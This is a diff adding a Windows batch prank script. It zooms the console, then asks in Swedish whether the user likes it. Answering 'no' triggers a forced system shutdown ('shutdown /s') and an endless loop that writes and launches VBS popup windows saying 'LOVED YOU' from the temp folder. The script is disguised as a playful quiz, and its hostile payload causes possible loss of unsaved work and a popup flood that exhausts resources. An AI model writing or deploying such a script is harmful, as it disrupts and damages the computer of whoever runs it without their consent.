@@ -1,0 +1,73 @@
+
+
+
+@echo off
+
+@echo off
+:: Run PowerShell to simulate F11 key press
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{F11}')"
+
+color 9
+
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
+
+
+cls
+
+set /p Fråga=Gillar du mig?(Ja eller Nej)_____:
+
+
+if %Fråga%==ja goto SvarJa
+if %Fråga%==Ja goto SvarJa
+if %Fråga%==JA goto SvarJa
+if %Fråga%==Nej goto SvarNej
+if %Fråga%==NEJ goto SvarNej
+if %Fråga%==nej goto SvarNej
+
+
+:SvarJa
+
+echo Ok Bye :)
+
+pause
+
+exit
+
+:SvarNej
+
+color 4
+
+cls
+
+Echo Men jag älskade dig:(
+
+timeout /t 1 >nul
+
+shutdown /s
+
+timeout /t 1 >nul
+
+:loop
+
+Color 07
+color 40
+color 07
+color 40
+
+@echo off
+echo Set objShell = CreateObject("WScript.Shell") > %temp%\popup.vbs
+echo objShell.Popup "ÄLSKADE DIG", 10, "ERROR", 64 >> %temp%\popup.vbs
+start %temp%\popup.vbs
+
+goto loop
+
+ 
